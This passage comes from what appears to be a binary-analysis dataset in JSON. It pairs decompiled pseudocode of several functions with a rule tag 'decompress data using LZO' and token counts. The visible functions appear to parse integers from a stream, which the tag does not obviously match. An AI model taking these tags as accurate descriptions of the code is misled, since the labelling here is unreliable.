'\\0') {\n        *arg_1ch = 4;\n    }\n    if ((bVar15) || ((var_48h | var_2ch) != 0)) goto code_r0x00467109;\n    goto code_r0x00466eb3;\n}\n",
        "token_count": 5291
    },
    "00467720": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00467720(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    bool bVar8;\n    uint32_t uVar9;\n    char cVar10;\n    bool bVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    bool bVar15;\n    ulong uVar16;\n    uint var_65h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint32_t var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint8_t var_44h;\n    uint8_t var_43h;\n    uint8_t var_42h;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_31h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_bp_ch;\n    \n    iVar6 = arg_18h;\n    uVar13 = 8;\n    iVar3 = fcn.0044da00(arg_18h + 0x6c);\n    uVar4 = *(iVar6 + 0xc) & 0x4a;\n    if ((uVar4 != 0x40) && (uVar13 = 0x10,  uVar4 != 8)) {\n        uVar13 = 10;\n    }\n    bVar8 = arg_8h != NULL && arg_ch == 0xffffffff;\n    bVar15 = arg_ch == 0xffffffff;\n    if (((bVar8) && (bVar15 = false,  arg_8h[3] <= arg_8h[2])) && (iVar6 = (**(*arg_8h + 0x24))(),  iVar6 == -1)) {\n        arg_8h = NULL;\n        bVar15 = bVar8;\n    }\n    bVar8 = arg_10h != NULL && arg_14h == -1;\n    var_48h._0_1_ = arg_14h == -1;\n    if ((bVar8) && (var_48h._0_1_ = false,  arg_10h[3] <= arg_10h[2])) {\n        iVar6 = (**(*arg_10h + 0x24))();\n        var_48h._0_1_ = false;\n        if (iVar6 == -1) {\n            arg_10h = NULL;\n            var_48h._0_1_ = bVar8;\n        }\n    }\n    if (var_48h == bVar15) {\n        bVar8 = false;\n        uVar7 = 0;\n        var_42h = 1;\n        var_48h = 0;\n        bVar15 = false;\n    }\n    else {\n        uVar7 = arg_ch;\n        if ((arg_ch == 0xffffffff) && (arg_8h != NULL)) {\n            if (arg_8h[2] < arg_8h[3]) {\n                uVar7 = *arg_8h[2];\n            }\n            else {\n                uVar7 = (**(*arg_8h + 0x24))();\n                if (uVar7 == 0xffffffff) {\n                    arg_8h = NULL;\n                    uVar7 = 0xffffffff;\n                }\n            }\n        }\n        cVar2 = *(iVar3 + 0x10);\n        cVar10 = uVar7;\n        bVar8 = *(iVar3 + 0x4a) == cVar10;\n        if ((bVar8) || (*(iVar3 + 0x4b) == cVar10)) {\n            if (((cVar2 == '\\0') || (*(iVar3 + 0x25) != cVar10)) && (*(iVar3 + 0x24) != cVar10)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 1;\n                }\n                else {\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = 0xffffffff;\n                var_42h = fcn.004502d0(&arg_10h);\n                var_48h = 0;\n                bVar15 = false;\n                if (var_42h != 0) goto code_r0x00467821;\n                uVar7 = fcn.00450370();\n                cVar2 = *(iVar3 + 0x10);\n            }\n        }\n        else {\n            bVar8 = false;\n        }\n        var_48h = 0;\n        bVar15 = false;\n        while (((cVar10 = uVar7,  cVar2 == '\\0' || (*(iVar3 + 0x25) != cVar10)) && (*(iVar3 + 0x24) != cVar10))) {\n            if (*(iVar3 + 0x4e) == cVar10) {\n                bVar1 = uVar13 == 10 | bVar15 ^ 1U;\n                if (!bVar1) goto code_r0x00467a30;\n                bVar15 = uVar4 == 0 || uVar13 == 8;\n                if (uVar4 != 0 && uVar13 != 8) {\n                    var_48h = var_48h + 1;\n                    goto code_r0x00467a64;\n                }\n                var_48h = 0;\n                uVar13 = 8;\n                uVar12 = arg_8h[2];\n                if (arg_8h[3] <= uVar12) {\n                    uVar13 = 8;\n                    goto code_r0x00467b10;\n                }\ncode_r0x00467a73:\n                arg_8h[2] = uVar12 + 1;\ncode_r0x00467a80:\n                var_50h._0_1_ = false;\n                if ((arg_8h[3] <= arg_8h[2]) && (iVar6 = (**(*arg_8h + 0x24))(),  iVar6 == -1)) {\n                    arg_8h = NULL;\n                    var_50h._0_1_ = true;\n                }\n            }\n            else {\n                if (!bVar15) break;\ncode_r0x00467a30:\n                if ((*(iVar3 + 0x4c) != cVar10) && (*(iVar3 + 0x4d) != cVar10)) {\n                    var_42h = 0;\n                    bVar15 = true;\n                    goto code_r0x00467821;\n                }\n                var_42h = uVar13 == 0x10 || uVar4 == 0;\n                if (uVar13 != 0x10 && uVar4 != 0) {\n                    bVar15 = true;\n                    goto code_r0x0046782d;\n                }\n                var_48h = 0;\n                uVar13 = 0x10;\n                bVar1 = false;\ncode_r0x00467a64:\n                uVar12 = arg_8h[2];\n                bVar15 = bVar1;\n                if (uVar12 < arg_8h[3]) goto code_r0x00467a73;\ncode_r0x00467b10:\n                (**(*arg_8h + 0x28))();\n                if (arg_8h != NULL) goto code_r0x00467a80;\n                var_50h._0_1_ = true;\n            }\n            arg_ch = 0xffffffff;\n            bVar1 = arg_10h != NULL && arg_14h == -1;\n            var_42h = arg_14h == -1;\n            if ((bVar1) && (var_42h = false,  arg_10h[3] <= arg_10h[2])) {\n                var_42h = false;\n                iVar6 = (**(*arg_10h + 0x24))();\n                if (iVar6 == -1) {\n                    arg_10h = NULL;\n                    var_42h = bVar1;\n                }\n            }\n            if (var_50h._0_1_ == var_42h) {\n                var_42h = 1;\n                goto code_r0x00467821;\n            }\n            uVar7 = arg_ch;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar7 = *arg_8h[2];\n                }\n                else {\n                    uVar7 = (**(*arg_8h + 0x24))();\n                    if (uVar7 == 0xffffffff) {\n                        arg_8h = NULL;\n                        uVar7 = 0xffffffff;\n                    }\n                }\n            }\n            if (!bVar15) break;\n            cVar2 = *(iVar3 + 0x10);\n        }\n        var_42h = 0;\n    }\ncode_r0x00467821:\n    var_54h = 0x16;\n    if (uVar13 != 0x10) {\ncode_r0x0046782d:\n        var_54h = uVar13;\n    }\n    unique0x00001d00 = &var_28h;\n    var_2ch = 0;\n    var_28h = var_28h & 0xffffff00;\n    if (*(iVar3 + 0x10) != '\\0') {\n        fcn.004b1bc0(0x20);\n    }\n    uVar16 = fcn.00437f00(0xffffffff, 0xffffffff, uVar13, 0);\n    uVar4 = uVar16 >> 0x20;\n    var_43h = *(iVar3 + 100);\n    if (var_43h == 0) {\n        if (var_42h == 0) {\n            var_44h = 0;\n            uVar12 = 0;\n            uVar14 = 0;\ncode_r0x004678b0:\n            cVar2 = uVar7;\n            iVar6 = cVar2;\n            if (var_54h < 0xb) {\n                if ((cVar2 < '0') || (var_54h + '0' <= cVar2)) goto code_r0x00467b82;\n            }\n            else if (9 < cVar2 - 0x30U) goto code_r0x00467b6b;\n            uVar7 = iVar6 - 0x30;\ncode_r0x004678d2:\n            if (uVar7 != 0xffffffff) {\n                do {\n                    if (uVar4 < uVar14 || uVar4 - uVar14 < (uVar16 < uVar12)) {\n                        var_44h = 1;\n                        uVar7 = arg_8h[2];\n                        if (arg_8h[3] <= uVar7) goto code_r0x00467c23;\ncode_r0x0046792e:\n                        arg_8h[2] = uVar7 + 1;\ncode_r0x0046793b:\n                        var_43h = false;\n                        if (arg_8h[3] <= arg_8h[2]) {\n                            iVar6 = (**(*arg_8h + 0x24))();\n                            var_43h = false;\n                            if (iVar6 == -1) {\n                                arg_8h = NULL;\n                                var_43h = true;\n                            }\n                        }\n                    }\n                    else {\n                        uVar5 = uVar12 * uVar13;\n                        uVar14 = (uVar12 * uVar13 >> 0x20) + uVar13 * uVar14;\n                        uVar12 = ~(uVar7 >> 0x1f);\n                        var_44h = var_44h | (uVar12 < uVar14 || uVar12 - uVar14 < (~uVar7 < uVar5));\n                        uVar12 = uVar7 + uVar5;\n                        uVar14 = (uVar7 >> 0x1f) + uVar14 + CARRY4(uVar7, uVar5);\n                        var_48h = var_48h + 1;\n                        uVar7 = arg_8h[2];\n                        if (uVar7 < arg_8h[3]) goto code_r0x0046792e;\ncode_r0x00467c23:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x0046793b;\n                        var_43h = true;\n                    }\n                    arg_ch = 0xffffffff;\n                    bVar11 = arg_10h != NULL && arg_14h == -1;\n                    bVar1 = arg_14h == -1;\n                    if ((bVar11) && (bVar1 = false,  arg_10h[3] <= arg_10h[2])) {\n                        iVar6 = (**(*arg_10h + 0x24))();\n                        bVar1 = false;\n                        if (iVar6 == -1) {\n                            arg_10h = NULL;\n                            bVar1 = bVar11;\n                        }\n                    }\n                    if (var_43h == bVar1) {\n                        var_43h = 1;\n                        goto code_r0x00467972;\n                    }\n                    uVar7 = arg_ch;\n                    if (arg_8h == NULL) goto code_r0x004678b0;\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar7 = *arg_8h[2];\n                        goto code_r0x004678b0;\n                    }\n                    uVar7 = (**(*arg_8h + 0x24))();\n                    if (uVar7 != 0xffffffff) goto code_r0x004678b0;\n                    arg_8h = NULL;\n                    if (var_54h < 0xb) break;\n                    cVar2 = -1;\n                    iVar6 = -1;\ncode_r0x00467b6b:\n                    if (5 < cVar2 + 0x9fU) goto code_r0x00467ce0;\n                    uVar7 = iVar6 - 0x57;\n                    if (uVar7 == 0xffffffff) break;\n                } while( true );\n            }\n            goto code_r0x00467b82;\n        }\n        var_43h = var_42h;\n        var_44h = 0;\n        uVar12 = 0;\n        var_42h = 0;\n        uVar14 = 0;\n    }\n    else {\n        if (var_42h == 0) {\n            var_44h = 0;\n            uVar12 = 0;\n            uVar14 = 0;\ncode_r0x00467d4b:\n            uVar5 = var_2ch;\n            cVar2 = uVar7;\n            if ((*(iVar3 + 0x10) == 0) || (*(iVar3 + 0x25) != cVar2)) {\n                if ((cVar2 == *(iVar3 + 0x24)) ||\n                   (iVar6 = sub.msvcrt.dll_memchr(iVar3 + 0x4e, cVar2, var_54h),  iVar6 == 0)) goto code_r0x00467b82;\n                uVar7 = iVar6 - (iVar3 + 0x4e);\n                if (0xf < uVar7) {\n                    uVar7 = uVar7 - 6;\n                }\n                if (uVar14 <= uVar4 && (uVar16 < uVar12) <= uVar4 - uVar14) {\n                    uVar5 = uVar12 * uVar13;\n                    uVar14 = (uVar12 * uVar13 >> 0x20) + uVar13 * uVar14;\n                    uVar12 = ~(uVar7 >> 0x1f);\n                    var_44h = var_44h | (uVar12 < uVar14 || uVar12 - uVar14 < (~uVar7 < uVar5));\n                    uVar12 = uVar5 + uVar7;\n                    uVar14 = uVar14 + (uVar7 >> 0x1f) + CARRY4(uVar5, uVar7);\n                    var_48h = var_48h + 1;\n                    goto code_r0x00467dda;\n                }\n                uVar7 = arg_8h[2];\n                var_44h = var_43h;\n                if (arg_8h[3] <= uVar7) goto code_r0x00467e34;\ncode_r0x00467de5:\n                arg_8h[2] = uVar7 + 1;\ncode_r0x00467df2:\n                var_65h._1_1_ = 0;\n                if (arg_8h[3] <= arg_8h[2]) {\n                    iVar6 = (**(*arg_8h + 0x24))();\n                    var_65h._1_1_ = 0;\n                    if (iVar6 == -1) {\n                        arg_8h = NULL;\n                        var_65h._1_1_ = var_43h;\n                    }\n                }\n            }\n            else {\n                if (var_48h == 0) {\n                    var_43h = 0;\n                    var_42h = *(iVar3 + 0x10);\n                    goto code_r0x00467972;\n                }\n                uVar7 = var_2ch + 1;\n                uVar9 = 0xf;\n                if (stack0xffffffcc != &var_28h) {\n                    uVar9 = var_28h;\n                }\n                if (uVar9 < uVar7) {\n                    fcn.004b1f10(var_2ch, 0, 0, 1);\n                }\n                var_48h = 0;\n                *(stack0xffffffcc + uVar5) = var_48h;\n                *(stack0xffffffcc + uVar7) = 0;\n                var_2ch = uVar7;\ncode_r0x00467dda:\n                uVar7 = arg_8h[2];\n                if (uVar7 < arg_8h[3]) goto code_r0x00467de5;\ncode_r0x00467e34:\n                (**(*arg_8h + 0x28))();\n                var_65h._1_1_ = var_43h;\n                if (arg_8h != NULL) goto code_r0x00467df2;\n            }\n            arg_ch = 0xffffffff;\n            bVar11 = arg_10h != NULL && arg_14h == -1;\n            bVar1 = arg_14h == -1;\n            if ((bVar11) && (bVar1 = false,  arg_10h[3] <= arg_10h[2])) {\n                iVar6 = (**(*arg_10h + 0x24))();\n                bVar1 = false;\n                if (iVar6 == -1) {\n                    arg_10h = NULL;\n                    bVar1 = bVar11;\n                }\n            }\n            if (var_65h._1_1_ == bVar1) goto code_r0x00467972;\n            uVar7 = arg_ch;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar7 = *arg_8h[2];\n                }\n                else {\n                    uVar7 = (**(*arg_8h + 0x24))();\n                    if (uVar7 == 0xffffffff) {\n                        arg_8h = NULL;\n                        uVar7 = 0xffffffff;\n                    }\n                }\n            }\n            goto code_r0x00467d4b;\n        }\n        uVar12 = 0;\n        uVar14 = 0;\n        var_44h = 0;\n        var_43h = var_42h;\n        var_42h = 0;\n    }\ncode_r0x00467972:\n    if (var_2ch != 0) goto code_r0x00467b91;\ncode_r0x0046797a:\n    if ((var_48h != 0) || (bVar15)) {\ncode_r0x00467bd9:\n        if (var_42h == 0) {\n            if (var_44h == 0) {\n                if (bVar8) {\n                    bVar15 = uVar12 != 0;\n                    uVar12 = -uVar12;\n                    uVar14 = -(uVar14 + bVar15);\n                }\n                *arg_20h = uVar12;\n                arg_20h[1] = uVar14;\n            }\n            else {\n                *arg_20h = 0xffffffff;\n                arg_20h[1] = 0xffffffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x004679a8;\n        }\n    }\ncode_r0x0046798f:\n    *arg_20h = 0;\n    arg_20h[1] = 0;\n    *arg_1ch = 4;\ncode_r0x004679a8:\n    if (var_43h != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (stack0xffffffcc != &var_28h) {\n        fcn.004c2c30(stack0xffffffcc);\n    }\n    return CONCAT44(arg_ch, arg_8h);\ncode_r0x00467ce0:\n    if (5 < cVar2 + 0xbfU) goto code_r0x00467b82;\n    uVar7 = iVar6 - 0x37;\n    goto code_r0x004678d2;\ncode_r0x00467b82:\n    var_43h = 0;\n    if (var_2ch == 0) goto code_r0x0046797a;\ncode_r0x00467b91:\n    fcn.004b20a0(var_48h);\n    cVar2 = fcn.004bdf20(*(iVar3 + 8), *(iVar3 + 0xc), &var_31h + 1);\n    if (cVar2 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if ((bVar15) || ((var_48h | var_2ch) != 0)) goto code_r0x00467bd9;\n    goto code_r0x0046798f;\n}\n",
        "token_count": 5126
    },
    "004681d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.004681d0(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    char cVar3;\n    uint8_t uVar4;\n    char cVar5;\n    char cVar6;\n    bool bVar7;\n    char cVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    bool bVar15;\n    uint var_50h;\n    uint var_4ch;\n    uint8_t var_45h;\n    uint *var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar12 = arg_18h;\n    iVar9 = fcn.0044da00(arg_18h + 0x6c);\n    uVar10 = *(iVar12 + 0xc) & 0x4a;\n    if (uVar10 == 0x40) {\n        var_38h = 8;\ncode_r0x00468210:\n        cVar5 = fcn.004502d0(&arg_10h);\n        if (cVar5 == '\\0') {\ncode_r0x0046822f:\n            var_44h = &arg_10h;\n            uVar11 = fcn.004503c0();\n            cVar6 = uVar11;\n            bVar15 = *(iVar9 + 0x4a) == cVar6;\n            cVar5 = *(iVar9 + 0x10);\n            if ((((bVar15) || (*(iVar9 + 0x4b) == cVar6)) && ((cVar5 == '\\0' || (*(iVar9 + 0x25) != cVar6)))) &&\n               (*(iVar9 + 0x24) != cVar6)) {\n                fcn.004a5560();\n                arg_ch = 0xffffffff;\n                cVar5 = fcn.004502d0(var_44h);\n                var_34h = 0;\n                bVar2 = false;\n                if (cVar5 == '\\0') {\n                    uVar11 = fcn.004503c0();\n                    cVar5 = *(iVar9 + 0x10);\n                    goto code_r0x0046843c;\n                }\n            }\n            else {\ncode_r0x0046843c:\n                var_34h = 0;\n                bVar2 = false;\n                while (((cVar6 = uVar11,  cVar5 == '\\0' || (*(iVar9 + 0x25) != cVar6)) && (*(iVar9 + 0x24) != cVar6))) {\n                    if (*(iVar9 + 0x4e) == cVar6) {\n                        bVar7 = var_38h == 10 | bVar2 ^ 1U;\n                        if (!bVar7) goto code_r0x00468479;\n                        bVar2 = uVar10 == 0 || var_38h == 8;\n                        if (uVar10 != 0 && var_38h != 8) {\n                            var_34h = var_34h + 1;\n                            goto code_r0x004684ad;\n                        }\n                        var_34h = 0;\n                        var_38h = 8;\n                        uVar13 = arg_8h[2];\n                        if (arg_8h[3] <= uVar13) goto code_r0x00468550;\ncode_r0x004684bc:\n                        arg_8h[2] = uVar13 + 1;\ncode_r0x004684c9:\n                        var_38h._0_1_ = false;\n                        if ((arg_8h[3] <= arg_8h[2]) && (iVar12 = (**(*arg_8h + 0x24))(),  iVar12 == -1)) {\n                            arg_8h = NULL;\n                            var_38h._0_1_ = true;\n                        }\n                    }\n                    else {\n                        if (!bVar2) break;\ncode_r0x00468479:\n                        if ((*(iVar9 + 0x4c) != cVar6) && (*(iVar9 + 0x4d) != cVar6)) {\n                            cVar5 = '\\0';\n                            bVar2 = true;\n                            goto code_r0x004682a1;\n                        }\n                        cVar5 = var_38h == 0x10 || uVar10 == 0;\n                        if (var_38h != 0x10 && uVar10 != 0) {\n                            bVar2 = true;\n                            goto code_r0x004682ae;\n                        }\n                        var_34h = 0;\n                        var_38h = 0x10;\n                        bVar7 = false;\ncode_r0x004684ad:\n                        uVar13 = arg_8h[2];\n                        bVar2 = bVar7;\n                        if (uVar13 < arg_8h[3]) goto code_r0x004684bc;\ncode_r0x00468550:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x004684c9;\n                        var_38h._0_1_ = true;\n                    }\n                    arg_ch = 0xffffffff;\n                    bVar7 = arg_10h != NULL && arg_14h == -1;\n                    var_45h = arg_14h == -1;\n                    if ((bVar7) && (var_45h = false,  arg_10h[3] <= arg_10h[2])) {\n                        var_45h = false;\n                        iVar12 = (**(*arg_10h + 0x24))();\n                        if (iVar12 == -1) {\n                            arg_10h = NULL;\n                            var_45h = bVar7;\n                        }\n                    }\n                    if (var_38h._0_1_ == var_45h) {\n                        cVar5 = '\\x01';\n                        goto code_r0x004682a1;\n                    }\n                    uVar11 = arg_ch;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar11 = *arg_8h[2];\n                        }\n                        else {\n                            uVar11 = (**(*arg_8h + 0x24))();\n                            if (uVar11 == 0xffffffff) {\n                                arg_8h = NULL;\n                                uVar11 = 0xffffffff;\n                            }\n                        }\n                    }\n                    if (!bVar2) break;\n                    cVar5 = *(iVar9 + 0x10);\n                }\n                cVar5 = '\\0';\n            }\ncode_r0x004682a1:\n            var_40h = 0x16;\n            if (var_38h == 0x10) goto code_r0x004682b4;\n        }\n        else {\n            uVar11 = 0;\n            var_34h = 0;\n            bVar2 = false;\n            bVar15 = false;\n        }\ncode_r0x004682ae:\n        var_40h = var_38h;\n    }\n    else {\n        if (uVar10 != 8) {\n            var_38h = 10;\n            goto code_r0x00468210;\n        }\n        cVar5 = fcn.004502d0(&arg_10h);\n        if (cVar5 == '\\0') {\n            var_38h = 0x10;\n            goto code_r0x0046822f;\n        }\n        uVar11 = 0;\n        var_34h = 0;\n        bVar2 = false;\n        bVar15 = false;\n        var_38h = 0x10;\n        var_40h = 0x16;\n    }\ncode_r0x004682b4:\n    var_44h = &arg_10h;\n    *NULL = fcn.0048b140(0, 0, &var_1eh + 1);\n    if (*(iVar9 + 0x10) != '\\0') {\n        fcn.0048c930(0x20);\n    }\n    uVar10 = 0xffffffff / var_38h;\n    uVar1 = *(iVar9 + 100);\n    cVar6 = cVar5;\n    if (uVar1 == 0) {\n        var_45h = 0;\n        if (cVar5 == '\\0') {\n            uVar13 = 0;\n            do {\n                cVar6 = uVar11;\n                iVar12 = cVar6;\n                if (var_40h < 0xb) {\n                    if ((cVar6 < '0') || (var_40h + '0' <= cVar6)) goto code_r0x004685c4;\ncode_r0x00468331:\n                    uVar11 = iVar12 - 0x30;\n                }\n                else {\n                    if (cVar6 - 0x30U < 10) goto code_r0x00468331;\n                    if (cVar6 + 0x9fU < 6) {\n                        uVar11 = iVar12 - 0x57;\n                    }\n                    else {\n                        if (5 < cVar6 + 0xbfU) goto code_r0x004685c4;\n                        uVar11 = iVar12 - 0x37;\n                    }\n                }\n                if (uVar11 == 0xffffffff) goto code_r0x004685c4;\n                if (uVar10 < uVar13) {\n                    var_45h = 1;\n                    uVar11 = arg_8h[2];\n                    if (arg_8h[3] <= uVar11) goto code_r0x00468663;\ncode_r0x0046836b:\n                    arg_8h[2] = uVar11 + 1;\n                }\n                else {\n                    uVar14 = uVar13 * var_38h;\n                    uVar13 = uVar14 + uVar11;\n                    var_45h = var_45h | ~uVar11 < uVar14;\n                    uVar11 = arg_8h[2];\n                    var_34h = var_34h + 1;\n                    if (uVar11 < arg_8h[3]) goto code_r0x0046836b;\ncode_r0x00468663:\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = 0xffffffff;\n                cVar6 = fcn.004502d0(var_44h);\n                cVar8 = cVar5;\n                if (cVar6 != '\\0') goto code_r0x00468393;\n                uVar11 = fcn.004503c0();\n            } while( true );\n        }\n        uVar13 = 0;\n        cVar8 = '\\0';\ncode_r0x00468393:\n        cVar3 = cVar6;\n        cVar5 = cVar8;\n        if (*(stack0xffffffe0 + -0xc) == 0) goto code_r0x004683a1;\ncode_r0x004685d4:\n        cVar6 = cVar3;\n        fcn.0048cc10(var_34h);\n        cVar8 = fcn.004bdf60(*(iVar9 + 8), *(iVar9 + 0xc), &var_1eh + 2);\n        if (cVar8 == '\\0') {\n            *arg_1ch = 4;\n        }\n        if (((var_34h != 0) || (bVar2)) || (*(stack0xffffffe0 + -0xc) != 0)) goto code_r0x00468622;\n    }\n    else {\n        if (cVar5 != '\\0') {\n            uVar13 = 0;\n            var_45h = 0;\n            cVar8 = '\\0';\n            goto code_r0x00468393;\n        }\n        var_45h = 0;\n        uVar13 = 0;\n        cVar8 = *(iVar9 + 0x10);\n        if ((cVar8 != '\\0') && (*(iVar9 + 0x25) == uVar11)) goto code_r0x004687d0;\ncode_r0x00468727:\n        if ((uVar11 != *(iVar9 + 0x24)) && (iVar12 = sub.msvcrt.dll_memchr(iVar9 + 0x4e, uVar11, var_40h),  iVar12 != 0)\n           ) {\n            uVar11 = iVar12 - (iVar9 + 0x4e);\n            if (0xf < uVar11) {\n                uVar11 = uVar11 - 6;\n            }\n            uVar4 = uVar1;\n            if (uVar13 <= uVar10) {\n                uVar14 = uVar13 * var_38h;\n                var_34h = var_34h + 1;\n                uVar13 = uVar14 + uVar11;\n                uVar4 = var_45h | ~uVar11 < uVar14;\n            }\n            var_45h = uVar4;\n            uVar11 = arg_8h[2];\n            if (arg_8h[3] <= uVar11) goto code_r0x004687fe;\n            do {\n                arg_8h[2] = uVar11 + 1;\n                while( true ) {\n                    arg_ch = 0xffffffff;\n                    cVar6 = fcn.004502d0(var_44h);\n                    cVar8 = cVar5;\n                    if (cVar6 != '\\0') goto code_r0x00468393;\n                    uVar11 = fcn.004503c0();\n                    cVar8 = *(iVar9 + 0x10);\n                    if ((cVar8 == '\\0') || (*(iVar9 + 0x25) != uVar11)) goto code_r0x00468727;\ncode_r0x004687d0:\n                    if (var_34h == 0) {\n                        cVar6 = '\\0';\n                        goto code_r0x00468393;\n                    }\n                    fcn.0048cc10(var_34h);\n                    var_34h = 0;\n                    uVar11 = arg_8h[2];\n                    if (uVar11 < arg_8h[3]) break;\ncode_r0x004687fe:\n                    (**(*arg_8h + 0x28))();\n                }\n            } while( true );\n        }\ncode_r0x004685c4:\n        cVar6 = '\\0';\n        cVar3 = '\\0';\n        if (*(stack0xffffffe0 + -0xc) != 0) goto code_r0x004685d4;\ncode_r0x004683a1:\n        if ((var_34h != 0) || (bVar2)) {\ncode_r0x00468622:\n            if (cVar5 == '\\0') {\n                if (var_45h == 0) {\n                    if (bVar15) {\n                        uVar13 = -uVar13;\n                    }\n                    *arg_20h = uVar13;\n                }\n                else {\n                    *arg_20h = 0xffffffff;\n                    *arg_1ch = 4;\n                }\n                goto code_r0x004683c8;\n            }\n        }\n    }\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x004683c8:\n    if (cVar6 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0048b630(&var_1eh + 1);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 3602
    },
    "00468960": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00468960(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    uint8_t uVar4;\n    char cVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    bool bVar11;\n    uint32_t var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    uint32_t var_4ch;\n    uint32_t var_48h;\n    uint var_44h;\n    uint *var_40h;\n    uint32_t var_3ch;\n    int32_t var_38h;\n    uint8_t var_33h;\n    uint8_t var_32h;\n    uint8_t var_31h;\n    uint32_t var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar9 = arg_18h;\n    iVar6 = fcn.0044da00(arg_18h + 0x6c);\n    uVar7 = *(iVar9 + 0xc) & 0x4a;\n    if (uVar7 == 0x40) {\n        var_30h = 8;\ncode_r0x0046899f:\n        var_32h = fcn.004502d0(&arg_10h);\n        if (var_32h == 0) {\ncode_r0x004689be:\n            var_40h = &arg_10h;\n            uVar8 = fcn.004503c0();\n            cVar1 = uVar8;\n            bVar11 = *(iVar6 + 0x4a) == cVar1;\n            cVar5 = *(iVar6 + 0x10);\n            if ((((bVar11) || (*(iVar6 + 0x4b) == cVar1)) && ((cVar5 == '\\0' || (*(iVar6 + 0x25) != cVar1)))) &&\n               (*(iVar6 + 0x24) != cVar1)) {\n                fcn.004a5560();\n                arg_ch = 0xffffffff;\n                var_32h = fcn.004502d0(var_40h);\n                var_38h = 0;\n                var_31h = false;\n                if (var_32h == 0) {\n                    uVar8 = fcn.004503c0();\n                    cVar5 = *(iVar6 + 0x10);\n                    goto code_r0x00468bc0;\n                }\n            }\n            else {\ncode_r0x00468bc0:\n                var_38h = 0;\n                var_31h = false;\n                while (((cVar1 = uVar8,  cVar5 == '\\0' || (*(iVar6 + 0x25) != cVar1)) && (*(iVar6 + 0x24) != cVar1))) {\n                    if (*(iVar6 + 0x4e) == cVar1) {\n                        var_31h = var_30h == 10 | var_31h ^ 1;\n                        if (var_31h == false) goto code_r0x00468bfc;\n                        bVar3 = uVar7 == 0 || var_30h == 8;\n                        if (uVar7 != 0 && var_30h != 8) {\n                            var_38h = var_38h + 1;\n                            goto code_r0x00468c30;\n                        }\n                        var_38h = 0;\n                        var_30h = 8;\n                        uVar10 = arg_8h[2];\n                        var_31h = bVar3;\n                        if (arg_8h[3] <= uVar10) goto code_r0x00468e80;\ncode_r0x00468c3f:\n                        arg_8h[2] = uVar10 + 1;\ncode_r0x00468c4c:\n                        var_32h = false;\n                        if ((arg_8h[3] <= arg_8h[2]) && (iVar9 = (**(*arg_8h + 0x24))(),  iVar9 == -1)) {\n                            arg_8h = NULL;\n                            var_32h = true;\n                        }\n                    }\n                    else {\n                        if (var_31h == false) break;\ncode_r0x00468bfc:\n                        if ((*(iVar6 + 0x4c) != cVar1) && (*(iVar6 + 0x4d) != cVar1)) {\n                            var_32h = 0;\n                            var_31h = true;\n                            goto code_r0x00468a30;\n                        }\n                        var_32h = var_30h == 0x10 || uVar7 == 0;\n                        if (var_30h != 0x10 && uVar7 != 0) {\n                            var_31h = true;\n                            goto code_r0x00468a3c;\n                        }\n                        var_38h = 0;\n                        var_31h = false;\n                        var_30h = 0x10;\ncode_r0x00468c30:\n                        uVar10 = arg_8h[2];\n                        if (uVar10 < arg_8h[3]) goto 